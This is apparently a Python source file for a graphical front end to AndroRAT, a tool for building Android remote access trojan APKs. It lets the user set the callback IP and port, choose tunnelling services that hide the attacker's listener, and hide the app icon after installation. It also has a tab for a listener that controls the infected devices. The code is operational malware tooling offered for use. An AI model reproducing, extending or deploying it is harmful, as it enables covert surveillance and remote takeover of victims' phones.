#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AndroRAT GUI Application
A graphical user interface for the AndroRAT tool.
Provides an easy-to-use interface for building APKs and managing connections.
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import threading
import queue
import sys
import os
import platform
import subprocess
from utils import *

class AndroRATGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("AndroRAT - Android Remote Administration Tool")
        self.root.geometry("800x600")
        self.root.minsize(600, 500)
        
        # Configure styles
        style = ttk.Style()
        if 'clam' in style.theme_names():
            style.theme_use('clam')
        
        # Message queue for thread communication
        self.message_queue = queue.Queue()
        
        # Variables
        self.ip_var = tk.StringVar()
        self.port_var = tk.StringVar(value="8000")
        self.output_var = tk.StringVar(value="karma.apk")
        self.icon_var = tk.BooleanVar()
        self.ngrok_var = tk.BooleanVar()
        self.tunnel_var = tk.BooleanVar()
        self.tunnel_service_var = tk.StringVar(value="auto")
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create tabs
        self.create_build_tab()
        self.create_shell_tab()
        self.create_log_tab()
        
        # Status bar
        self.status_var = tk.StringVar(value="Ready")
        self.status_bar = ttk.Label(root, textvariable=self.status_var, relief=tk.SUNKEN)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Start message processing
        self.process_queue()
        
    def create_build_tab(self):
        """Create the APK building tab"""
        build_frame = ttk.Frame(self.notebook)
        self.notebook.add(build_frame, text="Build APK")
        
        # Header
        header_frame = ttk.Frame(build_frame)
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        title_label = ttk.Label(header_frame, text="AndroRAT APK Builder", 
                               font=('TkDefaultFont', 16, 'bold'))
        title_label.pack()
        
        subtitle_label = ttk.Label(header_frame, 
                                  text="Configure and build your Android RAT APK",
                                  font=('TkDefaultFont', 10))
        subtitle_label.pack()
        
        # Configuration frame
        config_frame = ttk.LabelFrame(build_frame, text="Configuration", padding=10)
        config_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Connection settings
        conn_frame = ttk.LabelFrame(config_frame, text="Connection Settings", padding=5)
        conn_frame.pack(fill=tk.X, pady=5)
        
        # Tunneling options
        tunnel_frame = ttk.LabelFrame(conn_frame, text="Tunneling Options", padding=5)
        tunnel_frame.pack(fill=tk.X, pady=5)
        
        # Auto tunnel checkbox
        ttk.Checkbutton(tunnel_frame, text="Auto-select best tunneling service", 
                       variable=self.tunnel_var, command=self.on_tunnel_toggle).pack(anchor=tk.W)
        
        # Tunneling service selection
        service_frame = ttk.Frame(tunnel_frame)
        service_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(service_frame, text="Preferred Service:").pack(side=tk.LEFT)
        self.service_combo = ttk.Combobox(service_frame, textvariable=self.tunnel_service_var,
                                         values=["auto", "cloudflared", "serveo", "localtunnel", "ngrok"],
                                         state="readonly", width=15)
        self.service_combo.pack(side=tk.LEFT, padx=(5, 0))
        
        # Info label for tunneling
        self.tunnel_info = ttk.Label(tunnel_frame, 
                                    text="✓ Recommended: Avoids ngrok credit card requirement",
                                    foreground="green", font=('TkDefaultFont', 9))
        self.tunnel_info.pack(anchor=tk.W, pady=2)
        
        # Legacy ngrok checkbox (with warning)
        ngrok_frame = ttk.Frame(tunnel_frame)
        ngrok_frame.pack(fill=tk.X, pady=2)
        
        ttk.Checkbutton(ngrok_frame, text="Use legacy ngrok (requires credit card for TCP)", 
                       variable=self.ngrok_var, command=self.on_ngrok_toggle).pack(side=tk.LEFT)
        
        self.ngrok_warning = ttk.Label(ngrok_frame, text="⚠ May require credit card", 
                                      foreground="orange", font=('TkDefaultFont', 8))
        self.ngrok_warning.pack(side=tk.LEFT, padx=(5, 0))
        
        # IP and Port
        ip_frame = ttk.Frame(conn_frame)
        ip_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(ip_frame, text="IP Address:").pack(side=tk.LEFT)
        self.ip_entry = ttk.Entry(ip_frame, textvariable=self.ip_var, width=20)
        self.ip_entry.pack(side=tk.LEFT, padx=(5, 10))
        
        ttk.Label(ip_frame, text="Port:").pack(side=tk.LEFT)
        ttk.Entry(ip_frame, textvariable=self.port_var, width=10).pack(side=tk.LEFT, padx=(5, 0))
        
        # Output settings
        output_frame = ttk.LabelFrame(config_frame, text="Output Settings", padding=5)
        output_frame.pack(fill=tk.X, pady=5)
        
        output_entry_frame = ttk.Frame(output_frame)
        output_entry_frame.pack(fill=tk.X)
        
        ttk.Label(output_entry_frame, text="APK Name:").pack(side=tk.LEFT)
        ttk.Entry(output_entry_frame, textvariable=self.output_var, width=20).pack(side=tk.LEFT, padx=(5, 10))
        
        ttk.Button(output_entry_frame, text="Browse", 
                  command=self.browse_output_file).pack(side=tk.LEFT)
        
        ttk.Checkbutton(output_frame, text="Visible icon after installation", 
                       variable=self.icon_var).pack(anchor=tk.W, pady=5)
        
        # Build button
        button_frame = ttk.Frame(build_frame)
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.build_button = ttk.Button(button_frame, text="Build APK", 
                                      command=self.start_build, style='Accent.TButton')
        self.build_button.pack(side=tk.LEFT)
        
        ttk.Button(button_frame, text="Clear Log", 
                  command=self.clear_log).pack(side=tk.LEFT, padx=(10, 0))
        
        # Progress bar
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(build_frame, variable=self.progress_var, 
                                           mode='indeterminate')
        self.progress_bar.pack(fill=tk.X, padx=10, pady=5)
        
    def create_shell_tab(self):
        """Create the shell connection tab"""
        shell_frame = ttk.Frame(self.notebook)
        self.notebook.add(shell_frame, text="Shell Connection")
        
        # Header
        header_frame = ttk.Frame(shell_frame)
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        title_label = ttk.Label(header_frame, text="Device Shell Interface", 
                               font=('TkDefaultFont', 16, 'bold'))
        title_label.pack()
        
        subtitle_label = ttk.Label(header_frame, 
                                  text="Connect to and control Android devices",
                                  font=('TkDefaultFont', 10))
        subtitle_label.pack()
        
        # Connection settings
        conn_frame = ttk.LabelFrame(shell_frame, text="Connection Settings", padding=10)
        conn_frame.pack(fill=tk.X, padx=10, pady=5)
        
        conn_controls = ttk.Frame(conn_frame)
        conn_controls.pack(fill=tk.X)
        
        ttk.Label(conn_controls, text="Listen IP:").pack(side=tk.LEFT)
        self.shell_ip_var = tk.StringVar(value="0.0.0.0")
        ttk.Entry(conn_controls, textvariable=self.shell_ip_var, width=15).pack(side=tk.LEFT, padx=(5, 10))
        
        ttk.Label(conn_controls, text="Port:").pack(side=tk.LEFT)
        self.shell_port_var = tk.StringVar(value="8000")
        ttk.Entry(conn_controls, textvariable=self.shell_port_var, width=10).pack(side=tk.LEFT, padx=(5, 10))
        
        self.shell_button = ttk.Button(conn_controls, text="Start Listener", 
                                      command=self.start_shell)
        self.shell_button.pack(side=tk.LEFT, padx=(10, 0))
        
        # Shell interface (placeholder for future implementation)
        shell_interface = ttk.LabelFrame(shell_frame, text="Shell Interface", padding=10)
        shell_interface.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        info_label = ttk.Label(shell_interface, 
                              text="Shell interface will be available after starting the listener.\n"
                                   "Use the CLI mode (python3 androRAT.py --shell) for full shell functionality.",
                              justify=tk.CENTER)
        info_label.pack(expand=True)
        
    def create_log_tab(self):
        """Create the log viewing tab"""
        log_frame = ttk.Frame(self.notebook)
        self.notebook.add(log_frame, text="Logs")
        
        # Header
        header_frame = ttk.Frame(log_frame)
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        title_label = ttk.Label(header_frame, text="Activity Logs", 
                               font=('TkDefaultFont', 16, 'bold'))
        title_label.pack()
        
        # Log display
        log_controls = ttk.Frame(log_frame)
        log_controls.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(log_controls, text="Clear Logs", 
                  command=self.clear_log).pack(side=tk.LEFT)
        ttk.Button(log_controls, text="Save Logs", 
                  command=self.save_logs).pack(side=tk.LEFT, padx=(10, 0))
        
        # Log text area
        self.log_text = scrolledtext.ScrolledText(log_frame, height=20, wrap=tk.WORD)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Add initial log message
        self.add_log("AndroRAT GUI started successfully")
        self.add_log("Ready to build APKs and manage connections")
        
    def on_ngrok_toggle(self):
        """Handle ngrok checkbox toggle"""
        if self.ngrok_var.get():
            self.ip_entry.config(state='disabled')
            self.ip_var.set("(auto-configured by ngrok)")
            # Disable tunneling if ngrok is selected
            self.tunnel_var.set(False)
            self.on_tunnel_toggle()
        else:
            self.ip_entry.config(state='normal')
            self.ip_var.set("")
            
    def on_tunnel_toggle(self):
        """Handle auto-tunnel checkbox toggle"""
        if self.tunnel_var.get():
            self.ip_entry.config(state='disabled')
            self.ip_var.set("(auto-configured by tunnel)")
            # Disable ngrok if tunneling is selected
            self.ngrok_var.set(False)
            self.on_ngrok_toggle()
        else:
            if not self.ngrok_var.get():
                self.ip_entry.config(state='normal')
                self.ip_var.set("")
            
    def browse_output_file(self):
        """Browse for output APK file location"""
        filename = filedialog.asksaveasfilename(
            title="Save APK as...",
            defaultextension=".apk",
            filetypes=[("APK files", "*.apk"), ("All files", "*.*")]
        )
        if filename:
            self.output_var.set(os.path.basename(filename))
            
    def add_log(self, message, level="INFO"):
        """Add a message to the log"""
        import datetime
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_message = f"[{timestamp}] {level}: {message}\n"
        
        self.log_text.insert(tk.END, log_message)
        self.log_text.see(tk.END)
        
        # Add to queue for status bar
        self.message_queue.put(("status", message))
        
    def clear_log(self):
        """Clear the log display"""
        self.log_text.delete(1.0, tk.END)
        self.add_log("Log cleared")
        
    def save_logs(self):
        """Save logs to file"""
        filename = filedialog.asksaveasfilename(
            title="Save logs as...",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'w') as f:
                    f.write(self.log_text.get(1.0, tk.END))
                self.add_log(f"Logs saved to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save logs: {str(e)}")
                
    def validate_build_inputs(self):
        """Validate inputs for APK building"""
        # Check if either tunneling or manual IP is specified
        using_tunnel = self.ngrok_var.get() or self.tunnel_var.get()
        
        if not using_tunnel:
            if not self.ip_var.get() or self.ip_var.get().startswith("(auto-configured"):
                messagebox.showerror("Error", "IP address is required when not using tunneling")
                return False
            if not is_valid_ip(self.ip_var.get()):
                messagebox.showerror("Error", "Invalid IP address format")
                return False
                
        if not self.port_var.get():
            messagebox.showerror("Error", "Port is required")
            return False
            
        if not is_valid_port(self.port_var.get()):
            messagebox.showerror("Error", "Invalid port number (1-65535)")
            return False
            
        if not self.output_var.get():
            messagebox.showerror("Error", "Output filename is required")
            return False
            
        # Validate filename
        if not is_valid_filename(self.output_var.get()):
            # Auto-add .apk extension if missing
            filename = self.output_var.get()
            if not filename.lower().endswith('.apk'):
                filename += '.apk'
                self.output_var.set(filename)
            
            # Re-validate
            if not is_valid_filename(filename):
                messagebox.showerror("Error", "Invalid filename format")
                return False
            
        return True
        
    def start_build(self):
        """Start the APK building process"""
        if not self.validate_build_inputs():
            return
            
        # Disable build button and start progress
        self.build_button.config(state='disabled')
        self.progress_bar.start()
        
        # Start build in separate thread
        build_thread = threading.Thread(target=self.build_apk_thread)
        build_thread.daemon = True
        build_thread.start()
        
    def build_apk_thread(self):
        """APK building thread"""
        try:
            self.message_queue.put(("log", "Starting APK build process..."))
            
            # Prepare arguments
            ip = self.ip_var.get() if not (self.ngrok_var.get() or self.tunnel_var.get()) else None
            port = int(self.port_var.get())
            output = self.output_var.get()
            icon = self.icon_var.get()
            use_tunneling = self.ngrok_var.get() or self.tunnel_var.get()
            
            tunnel_manager = None
            final_ip = ip
            final_port = port
            
            # Handle tunneling
            if use_tunneling:
                self.message_queue.put(("log", "Setting up tunnel..."))
                
                try:
                    # Import tunneling module
                    from tunneling import create_tunnel_with_alternatives
                    
                    # Determine service preference
                    if self.ngrok_var.get():
                        service = "ngrok"
                    else:
                        service = self.tunnel_service_var.get()
                    
                    self.message_queue.put(("log", f"Trying {service} tunneling service..."))
                    
                    # Create tunnel
                    tunnel_manager, tunnel_result = create_tunnel_with_alternatives(port, service)
                    
                    if tunnel_result:
                        final_ip, final_port, tunnel_url = tunnel_result
                        self.message_queue.put(("log", f"Tunnel established: {final_ip}:{final_port}"))
                        self.message_queue.put(("log", f"Tunnel URL: {tunnel_url}"))
                    else:
                        self.message_queue.put(("error", "Failed to establish tunnel"))
                        return
                        
                except Exception as e:
                    self.message_queue.put(("error", f"Tunnel setup failed: {str(e)}"))
                    return
                    
            self.message_queue.put(("log", f"Building APK with IP: {final_ip}, Port: {final_port}"))
            
            # Call build function from utils
            build(final_ip, str(final_port), output, use_tunneling, str(port) if use_tunneling else None, icon)
            
            self.message_queue.put(("success", f"APK built successfully: {output}"))
            
            # If tunneling was used, optionally keep tunnel alive
            if tunnel_manager:
                self.message_queue.put(("log", "Tunnel will remain active for shell connections"))
                
        except Exception as e:
            self.message_queue.put(("error", f"Build failed: {str(e)}"))
        finally:
            self.message_queue.put(("build_done", None))
            if tunnel_manager:
                # Close tunnel after build
                tunnel_manager.close_tunnel()
            
    def start_shell(self):
        """Start shell listener"""
        ip = self.shell_ip_var.get()
        port = self.shell_port_var.get()
        
        if not ip or not port:
            messagebox.showerror("Error", "IP and port are required")
            return
            
        if not is_valid_port(port):
            messagebox.showerror("Error", "Invalid port number")
            return
            
        # For now, show info dialog about using CLI
        messagebox.showinfo("Shell Listener", 
                           f"To start shell listener on {ip}:{port}, use CLI mode:\n\n"
                           f"python3 androRAT.py --shell -i {ip} -p {port}")
        
    def process_queue(self):
        """Process messages from worker threads"""
        try:
            while True:
                msg_type, msg_data = self.message_queue.get_nowait()
                
                if msg_type == "log":
                    self.add_log(msg_data)
                elif msg_type == "error":
                    self.add_log(msg_data, "ERROR")
                elif msg_type == "success":
                    self.add_log(msg_data, "SUCCESS")
                elif msg_type == "status":
                    self.status_var.set(msg_data)
                elif msg_type == "build_done":
                    self.build_button.config(state='normal')
                    self.progress_bar.stop()
                    
        except queue.Empty:
            pass
            
        # Schedule next check
        self.root.after(100, self.process_queue)

def main():
    """Main function to run the GUI"""
    # Check Python version
    if sys.version_info < (3, 6):
        print("Error: Python version should be 3.6 or higher")
        sys.exit(1)
        
    # Create and run GUI
    root = tk.Tk()
    app = AndroRATGUI(root)
    
    try:
        root.mainloop()
    except KeyboardInterrupt:
        print("\nGUI closed by user")
        sys.exit(0)

if __name__ == "__main__":
    main()